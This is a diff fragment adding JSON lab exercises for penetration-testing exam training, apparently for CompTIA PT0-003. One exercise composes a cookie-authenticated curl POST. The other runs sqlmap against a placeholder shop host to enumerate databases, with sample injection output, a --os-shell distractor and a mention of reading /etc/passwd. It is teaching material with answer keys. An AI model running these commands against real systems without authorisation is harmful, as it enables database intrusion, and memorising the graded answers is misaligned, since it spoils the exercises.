+    "prompt": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$",
+    "steps": [
+      {
+        "id": "s1",
+        "task": "POST `{\"sku\":\"ACM-042\",\"qty\":1}` as JSON to `https://api.acme-corp.test/v1/orders`, sending `session=deadbeefcafebabe` as a cookie. Include response headers in the output and skip TLS verification.",
+        "hint": "`-X` sets the method, `-H` adds a header (Content-Type), `-d` sends the body, `--cookie` sets a Cookie header, `-i` prints headers, `-k` skips TLS verification. The URL is positional.",
+        "program": "curl",
+        "requirements": [
+          {
+            "id": "method",
+            "kind": "flag-value",
+            "variants": [
+              "-X",
+              "--request"
+            ],
+            "value": "POST",
+            "description": "-X, --request <method>         HTTP method to use"
+          },
+          {
+            "id": "ct",
+            "kind": "flag-value",
+            "variants": [
+              "-H",
+              "--header"
+            ],
+            "value": "Content-Type: application/json",
+            "description": "-H, --header <header>          custom request header (repeatable)"
+          },
+          {
+            "id": "body",
+            "kind": "flag-value",
+            "variants": [
+              "-d",
+              "--data"
+            ],
+            "value": "{\"sku\":\"ACM-042\",\"qty\":1}",
+            "description": "-d, --data <data>              HTTP POST data (URL-encoded unless --data-raw)"
+          },
+          {
+            "id": "cookie",
+            "kind": "flag-value",
+            "variants": [
+              "--cookie",
+              "-b"
+            ],
+            "value": "session=deadbeefcafebabe",
+            "description": "-b, --cookie <name=value>      supply cookie(s) on the request"
+          },
+          {
+            "id": "inc",
+            "kind": "flag",
+            "variants": [
+              "-i",
+              "--include"
+            ],
+            "description": "-i, --include                  include response headers in the output"
+          },
+          {
+            "id": "insec",
+            "kind": "flag",
+            "variants": [
+              "-k",
+              "--insecure"
+            ],
+            "description": "-k, --insecure                 allow insecure server connections when using SSL"
+          },
+          {
+            "id": "url",
+            "kind": "positional",
+            "variants": [
+              "https://api.acme-corp.test/v1/orders"
+            ],
+            "description": "<url>                          request URL"
+          }
+        ],
+        "distractors": [
+          {
+            "flag": "-L",
+            "description": "-L, --location                 follow HTTP 3xx redirects (can leak credentials across hosts)"
+          },
+          {
+            "flag": "--data-binary",
+            "description": "--data-binary <data>           post data exactly as given, no URL-encoding (use @file to read)"
+          },
+          {
+            "flag": "-v",
+            "description": "-v, --verbose                  make the operation more talkative"
+          },
+          {
+            "flag": "-o",
+            "description": "-o, --output <file>            write to <file> instead of stdout"
+          }
+        ],
+        "successOutput": "HTTP/2 201\nserver: nginx\ncontent-type: application/json\nlocation: /v1/orders/81245\nx-request-id: a31fe0c9\n\n{\"id\":81245,\"sku\":\"ACM-042\",\"qty\":1,\"status\":\"created\"}",
+        "canonicalCommand": "curl -X POST -H \"Content-Type: application/json\" -d '{\"sku\":\"ACM-042\",\"qty\":1}' --cookie \"session=deadbeefcafebabe\" -i -k https://api.acme-corp.test/v1/orders"
+      }
+    ],
+    "explanation": "**Every flag here earns its place:**\n\n- `-X POST` sets the method. Many servers do not need this if `-d` is present, but being explicit is safer when testing custom verbs.\n- `-H 'Content-Type: application/json'` makes the server parse the body correctly. Without it, many frameworks return `400`.\n- `-d '{...}'` is the JSON body.\n- `--cookie session=...` attaches a single cookie. Use this to reuse a captured session without a login round-trip.\n- `-i` prints response headers. You need these for status code, `Location`, CORS, and custom `X-*` headers.\n- `-k` skips TLS verification. Necessary in labs and self-signed environments. Never copy this into production code.\n\n**Why the distractors are wrong:**\n- `-L` auto-follows redirects, which can leak credentials or cookies to a different host and muddy results.\n- `--data-binary` is for raw binary payloads \u2014 fine, but the requested body is small JSON where `-d` is clearer. More importantly, `--data-binary @/etc/passwd` is a common foot-gun to avoid when copy/pasting.\n- `-v` dumps the whole TLS handshake and is noisy for this task.\n- `-o` would write the body to a file instead of showing it.",
+    "learningOutcomes": [
+      "Compose a JSON-bodied POST with the correct headers and cookie",
+      "Use `-i` to capture response metadata for analysis",
+      "Understand when `-k` and `-L` are appropriate (and when they are foot-guns)"
+    ],
+    "realWorldValue": "Every web-app pentester lives in curl between Burp requests. Knowing the exact flag set for a cookie-authenticated JSON POST is the difference between ten seconds and a ten-minute detour through documentation.",
+    "relatedExamCodes": [
+      "PT0-003"
+    ]
+  },
+  {
+    "id": "comptia-sqlmap-injection-command-terminal",
+    "title": "SQL Injection with sqlmap",
+    "description": "Run sqlmap non-interactively against a vulnerable GET parameter on an authenticated page to enumerate databases. Flags accepted in any order.",
+    "type": "command-terminal",
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Cybersecurity",
+    "labCategory": "Implement",
+    "technologies": [
+      "sqlmap",
+      "SQL injection",
+      "HTTP cookies",
+      "MySQL"
+    ],
+    "version": 1,
+    "scenario": "Authorised test of `https://shop.acme-corp.test` with a valid session cookie. The `id` parameter on `/product?id=1` is suspected SQLi. Enumerate databases non-interactively using level 3 / risk 2 (within the agreed engagement risk ceiling).",
+    "prompt": "\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$",
+    "steps": [
+      {
+        "id": "s1",
+        "task": "Run sqlmap against `https://shop.acme-corp.test/product?id=1`, passing `PHPSESSID=a9b0c1d2e3f4` as a cookie, at level 3, risk 2, and enumerate databases. Run non-interactively (accept defaults).",
+        "hint": "`-u` sets the target URL. `--cookie` supplies the session. `--level` and `--risk` need values. `--dbs` lists databases. `--batch` runs without prompts.",
+        "program": "sqlmap",
+        "requirements": [
+          {
+            "id": "url",
+            "kind": "flag-value",
+            "variants": [
+              "-u",
+              "--url"
+            ],
+            "value": "https://shop.acme-corp.test/product?id=1",
+            "description": "-u URL, --url=URL              target URL (e.g. \"http://www.site.com/vuln.php?id=1\")"
+          },
+          {
+            "id": "cookie",
+            "kind": "flag-value",
+            "variants": [
+              "--cookie"
+            ],
+            "value": "PHPSESSID=a9b0c1d2e3f4",
+            "description": "--cookie=COOKIE                HTTP Cookie header value"
+          },
+          {
+            "id": "level",
+            "kind": "flag-value",
+            "variants": [
+              "--level"
+            ],
+            "value": "3",
+            "description": "--level=LEVEL                  level of tests to perform (1-5, default 1)"
+          },
+          {
+            "id": "risk",
+            "kind": "flag-value",
+            "variants": [
+              "--risk"
+            ],
+            "value": "2",
+            "description": "--risk=RISK                    risk of tests to perform (1-3, default 1)"
+          },
+          {
+            "id": "dbs",
+            "kind": "flag",
+            "variants": [
+              "--dbs"
+            ],
+            "description": "--dbs                          enumerate DBMS databases"
+          },
+          {
+            "id": "batch",
+            "kind": "flag",
+            "variants": [
+              "--batch"
+            ],
+            "description": "--batch                        never ask for user input, use the default behaviour"
+          }
+        ],
+        "distractors": [
+          {
+            "flag": "--os-shell",
+            "description": "--os-shell                     prompt for an interactive operating system shell (requires high privilege)"
+          },
+          {
+            "flag": "--tamper",
+            "description": "--tamper=TAMPER                use given script(s) for tampering injection data"
+          },
+          {
+            "flag": "--threads",
+            "description": "--threads=THREADS              maximum number of concurrent HTTP requests (default 1)"
+          },
+          {
+            "flag": "--flush-session",
+            "description": "--flush-session                flush session files for the current target"
+          },
+          {
+            "flag": "--random-agent",
+            "description": "--random-agent                 use a randomly-selected HTTP User-Agent header"
+          }
+        ],
+        "successOutput": "        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.7.11}\n|_ -| . [)]     | .'| . |\n|___|_  [\\]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[12:23:40] [INFO] testing connection to the target URL\n[12:23:41] [INFO] checking if the target is protected by some kind of WAF/IPS\n[12:23:42] [INFO] testing if the target URL content is stable\n[12:23:45] [INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable\n[12:24:03] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu 22.04\nweb application technology: Nginx 1.24.0, PHP 8.1.2\nback-end DBMS: MySQL >= 5.0\n[12:24:05] [INFO] fetching database names\navailable databases [4]:\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] shop_prod",
+        "canonicalCommand": "sqlmap -u 'https://shop.acme-corp.test/product?id=1' --cookie='PHPSESSID=a9b0c1d2e3f4' --level=3 --risk=2 --dbs --batch"
+      }
+    ],
+    "explanation": "**Minimal-but-complete sqlmap invocation**\n\n- `-u URL` sets the injection point. If the parameter is not obvious, mark it with `*` (e.g. `id=1*`).\n- `--cookie` supplies the session so sqlmap can reach the authenticated page. Without it you'll test the login-redirect page.\n- `--level` raises the breadth of payloads (cookies, user-agent, referer tests) and `--risk` raises the potential impact (heavier blind tests, OR-based payloads).\n- `--dbs` tells sqlmap to enumerate the database list once a working injection is confirmed.\n- `--batch` runs non-interactively, using defaults for prompts. Essential in automation and report reruns.\n\n**Why the distractors are dangerous or off-task:**\n- `--os-shell` attempts to land an operating-system shell via SQLi \u2192 file-write primitives. Only run with explicit written approval \u2014 it can create persistent artefacts on the target.\n- `--tamper=` is useful when a WAF blocks default payloads, but it should be chosen based on observed WAF behaviour, not sprinkled in as a cargo-cult default.\n- `--threads` can overload a fragile target and trigger rate-limiting.\n- `--flush-session` discards the prior detection cache, making every rerun slower.\n- `--random-agent` breaks session cookies that are bound to the originally-seen User-Agent.",
+    "learningOutcomes": [
+      "Construct a minimum-viable authenticated sqlmap invocation with `-u`, `--cookie`, and `--batch`",
+      "Raise `--level`/`--risk` appropriately and stay inside engagement boundaries",
+      "Avoid dangerous extras like `--os-shell` without explicit authorisation"
+    ],
+    "realWorldValue": "sqlmap is a headline PT0-003 tool. Consultants who can drive it non-interactively, with a cookie-authenticated session and sensible level/risk, produce more repeatable and defensible evidence than those running stock `-u` and hoping for the best.",
+    "relatedExamCodes": [
+      "PT0-003"
+    ]
   }
 ]
